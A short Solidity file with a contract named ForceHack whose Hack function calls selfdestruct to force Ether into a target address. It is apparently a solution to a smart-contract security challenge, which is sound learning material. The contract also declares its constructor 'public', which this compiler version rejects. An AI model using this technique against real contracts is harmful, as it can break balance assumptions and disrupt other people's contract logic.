// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

contract ForceHack{
   
    constructor() public payable {

    }   

    function Hack(address payable _ContractAddress) public {
    
        selfdestruct(_ContractAddress);
    
    }
}
